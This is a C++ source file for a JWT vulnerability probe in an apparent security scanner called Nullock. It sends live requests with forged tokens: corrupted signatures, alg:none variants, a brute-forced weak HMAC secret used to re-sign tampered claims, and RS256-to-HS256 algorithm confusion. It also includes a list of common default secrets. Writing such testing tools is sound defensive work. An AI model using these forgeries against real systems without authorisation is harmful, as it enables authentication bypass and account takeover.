#include "jwt_probe.hpp"
#include "jwt_tool.hpp"
#include "networking.hpp"

#include <QJsonDocument>
#include <QJsonObject>

namespace Nullock::Core::JwtProbe {

namespace {

QString b64url(const QByteArray &b) {
    return QString::fromLatin1(
        b.toBase64(QByteArray::Base64UrlEncoding | QByteArray::OmitTrailingEquals));
}
QByteArray b64urlDecode(const QString &s) {
    return QByteArray::fromBase64(s.toLatin1(),
        QByteArray::Base64UrlEncoding | QByteArray::OmitTrailingEquals);
}

// A small built-in HS256 secret list (used when the caller gives none). These
// are the secrets that actually show up in dev/copy-pasted configs.
QStringList defaultSecrets() {
    return { "secret", "password", "changeme", "your-256-bit-secret", "jwt",
             "jwtsecret", "jwt_secret", "key", "private", "test", "admin",
             "123456", "secretkey", "supersecret", "token", "qwerty" };
}

// A header name that, if forwarded on the NO-TOKEN calibration shot, could keep
// the request authorized by a secondary credential and skew calibration.
bool isCredentialHeader(const QString &name) {
    const QString n = name.toLower();
    return n == "cookie" || n == "authorization"
        || n.contains("auth") || n.contains("token")
        || n.contains("session") || n.contains("api-key") || n.contains("apikey");
}

QByteArray buildRequest(const Request &req, const QString &token) {
    if (req.method.contains('\r')   || req.method.contains('\n'))   return {};
    if (req.basePath.contains('\r') || req.basePath.contains('\n')) return {};
    if (req.host.contains('\r')     || req.host.contains('\n'))     return {};
    if (req.query.contains('\r')    || req.query.contains('\n'))    return {};
    if (token.contains('\r')        || token.contains('\n'))        return {};
    const QString target = req.query.isEmpty() ? req.basePath : req.basePath + "?" + req.query;

    QString authHeaderName = QStringLiteral("Authorization");
    QString authHeaderValue = "Bearer " + token;
    QString cookieName;
    if (req.location.startsWith("header:", Qt::CaseInsensitive)) {
        authHeaderName = req.location.mid(7);
        authHeaderValue = token;
    } else if (req.location.startsWith("cookie:", Qt::CaseInsensitive)) {
        cookieName = req.location.mid(7);
        authHeaderName.clear();
    }
    if (authHeaderName.contains('\r') || authHeaderName.contains('\n')) return {};
    if (cookieName.contains('\r')     || cookieName.contains('\n'))     return {};

    QByteArray out;
    out  = req.method.toUtf8() + " " + target.toUtf8() + " HTTP/1.1\r\n";
    out += "Host: " + req.host.toUtf8() + "\r\n";
    out += "User-Agent: Nullock/jwt\r\n";
    out += "Accept: */*\r\n";
    out += "Accept-Encoding: identity\r\n";
    // An empty token => send NO auth at all (the "is this endpoint gated?" probe).
    if (!token.isEmpty() && !authHeaderName.isEmpty())
        out += authHeaderName.toUtf8() + ": " + authHeaderValue.toUtf8() + "\r\n";
    if (!token.isEmpty() && !cookieName.isEmpty())
        out += "Cookie: " + cookieName.toUtf8() + "=" + token.toUtf8() + "\r\n";
    for (const auto &h : req.headers) {
        if (h.first.compare("Host", Qt::CaseInsensitive) == 0) continue;
        if (!authHeaderName.isEmpty()
            && h.first.compare(authHeaderName, Qt::CaseInsensitive) == 0) continue;
        // On the no-token shot, drop secondary credentials so they don't keep
        // the request authorized and defeat calibration.
        if (token.isEmpty() && isCredentialHeader(h.first)) continue;
        if (h.first.contains('\r') || h.first.contains('\n')) continue;
        if (h.second.contains('\r') || h.second.contains('\n')) continue;
        out += h.first.toUtf8() + ": " + h.second.toUtf8() + "\r\n";
    }
    out += "Connection: close\r\n\r\n";
    return out;
}

// Invalidate the signature by flipping a byte of the DECODED signature (not a
// base64 char -- flipping the trailing char can land in dropped padding bits and
// round-trip to the SAME bytes for ~1/16 of tokens, which a correct verifier
// would then accept -> a false "signature not verified").
QString corruptSignature(const QString &token) {
    const QStringList parts = token.split('.');
    if (parts.size() < 3 || parts[2].isEmpty())
        return parts.mid(0, 2).join('.') + ".bm9wZXNpZ25hdHVyZQ";   // no sig -> add a junk one
    QByteArray sig = b64urlDecode(parts[2]);
    if (sig.isEmpty()) return parts[0] + "." + parts[1] + ".bm9wZQ";
    sig[0] = static_cast<char>(sig[0] ^ 0x01);                       // guaranteed-different byte
    return parts[0] + "." + parts[1] + "." + b64url(sig);
}

// alg:none bypass family -- servers that deny "none" case-sensitively, or check
// the allowlist before normalizing, miss these variants.
QStringList algNoneVariants(const JwtTool::Decoded &d) {
    static const char *kAlgs[] = { "none", "None", "NONE", "nOnE" };
    QStringList out;
    const QByteArray payload = b64url(QJsonDocument(d.payload).toJson(QJsonDocument::Compact)).toUtf8();
    for (const char *a : kAlgs) {
        QJsonObject h = d.header; h["alg"] = QString::fromLatin1(a);
        out << b64url(QJsonDocument(h).toJson(QJsonDocument::Compact)) + "." + payload + ".";
    }
    // empty-string alg and absent-alg header.
    { QJsonObject h = d.header; h["alg"] = QString();
      out << b64url(QJsonDocument(h).toJson(QJsonDocument::Compact)) + "." + payload + "."; }
    { QJsonObject h = d.header; h.remove("alg");
      out << b64url(QJsonDocument(h).toJson(QJsonDocument::Compact)) + "." + payload + "."; }
    return out;
}

} // namespace

Result test(const Request &req) {
    Result result;
    if (req.host.isEmpty())  { result.error = "host required"; return result; }
    if (req.token.isEmpty()) { result.error = "a captured JWT is required"; return result; }

    const JwtTool::Decoded d = JwtTool::decode(req.token);
    if (!d.ok) { result.error = "could not decode token: " + d.error; return result; }

    HttpClient client;
    const quint16 port = static_cast<quint16>(req.port);
    Request r = req;
    if (r.basePath.isEmpty()) r.basePath = QStringLiteral("/");
    if (r.method.isEmpty())   r.method = QStringLiteral("GET");
    auto send = [&](const QString &token) -> int {
        const QByteArray bytes = buildRequest(r, token);
        if (bytes.isEmpty()) return -1;
        ++result.requestsSent;
        const auto res = client.send(r.host, port, r.tls, bytes);
        return res.ok ? res.parsed.statusCode : -1;
    };

    // Calibration: no-token must be a REAL response that differs from the valid
    // token's (so the endpoint actually authenticates). A dropped (-1) no-token
    // probe must NOT pass calibration.
    const int noAuthStatus = send(QString());
    result.authStatus   = send(req.token);
    result.rejectStatus = noAuthStatus;
    const bool authOk = result.authStatus >= 200 && result.authStatus < 400;
    result.calibrated = authOk && noAuthStatus >= 0 && noAuthStatus != result.authStatus;
    if (!result.calibrated) {
        result.error = (result.authStatus < 0 || noAuthStatus < 0)
            ? "baseline request failed (transport error)"
            : QString("inconclusive: endpoint isn't auth-gated or the token isn't valid "
                      "(no-token status %1, valid-token status %2)")
                  .arg(noAuthStatus).arg(result.authStatus);
        return result;
    }
    const int accepted = result.authStatus;

    // A forgery counts as accepted only if it matches the valid baseline AND
    // does so on a re-send -- so a transient throttle/drop can't flip a verdict.
    auto acceptedStably = [&](const QString &token) -> bool {
        if (send(token) != accepted) return false;
        return send(token) == accepted;
    };

    // All three attack classes are independent -- run each regardless of the
    // others so a server with multiple flaws reports them all.

    // 1) signature not verified: a token with a genuinely-invalid signature is
    //    still accepted. (corruptSignature flips a real signature byte.)
    if (acceptedStably(corruptSignature(req.token))) {
        result.hits.append({ "signature-not-verified", "jwt-signature-not-verified",
            "the server accepted a token whose signature is invalid -- the JWT "
            "signature is not verified", corruptSignature(req.token) });
        result.vulnerable = true;
    }

    // 2) alg:none (and case/empty/absent variants).
    for (const QString &variant : algNoneVariants(d)) {
        if (acceptedStably(variant)) {
            result.hits.append({ "alg-none", "jwt-alg-none",
                "the server accepted an alg:none token (signature stripped) as valid",
                variant });
            result.vulnerable = true;
            break;
        }
    }

    // 3) weak HMAC secret: crack it, re-sign a tampered claim.
    if (d.alg.startsWith("HS", Qt::CaseInsensitive)) {
        const QStringList list = req.secretWordlist.isEmpty()
            ? defaultSecrets() : req.secretWordlist;
        const QString secret = JwtTool::bruteHmac(d, list);
        if (!secret.isEmpty()) {
            QJsonObject p = d.payload;
            p.insert(QStringLiteral("nlk"), QStringLiteral("1"));
            const QString forged = JwtTool::signHmac(d.header, p, secret.toUtf8());
            if (!forged.isEmpty() && acceptedStably(forged)) {
                result.hits.append({ "weak-secret", "jwt-weak-secret",
                    "the HS256 secret is weak (\"" + secret + "\"); a re-signed token "
                    "with a tampered claim was accepted", forged });
                result.vulnerable = true;
            }
        }
    }

    // 4) RS256->HS256 algorithm confusion: re-sign the token as HS256 using the
    //    server's PUBLIC KEY bytes as the HMAC secret. A server that verifies
    //    with the public key regardless of the alg header accepts it.
    const QString algLow = d.alg.toLower();
    const bool asymmetric = algLow.startsWith("rs") || algLow.startsWith("es")
                         || algLow.startsWith("ps");
    bool algConfusionUntested = false;
    if (asymmetric && req.publicKeyPem.isEmpty()) {
        algConfusionUntested = true;
    } else if (asymmetric) {
        QJsonObject h = d.header;  h["alg"] = "HS256";
        QJsonObject p = d.payload; p.insert(QStringLiteral("nlk"), QStringLiteral("1"));
        // Servers differ in the exact key bytes they verify with; try a few forms.
        const QStringList keys = { req.publicKeyPem, req.publicKeyPem.trimmed(),
                                   req.publicKeyPem.trimmed() + "\n" };
        for (const QString &k : keys) {
            const QString forged = JwtTool::signHmac(h, p, k.toUtf8());
            if (!forged.isEmpty() && acceptedStably(forged)) {
                result.hits.append({ "alg-confusion", "jwt-alg-confusion",
                    "the server accepted an HS256 token re-signed with its own public-key "
                    "bytes -- RS256->HS256 algorithm confusion", forged });
                result.vulnerable = true;
                break;
            }
        }
    }

    // Surface the gap when an asymmetric token couldn't be tested for confusion
    // and nothing else fired (so a clean result isn't mistaken for fully tested).
    if (algConfusionUntested && !result.vulnerable && result.error.isEmpty())
        result.error = "asymmetric token: RS256->HS256 algorithm confusion not tested "
                       "(supply the server public key via publicKey)";

    return result;
}

} // namespace Nullock::Core::JwtProbe
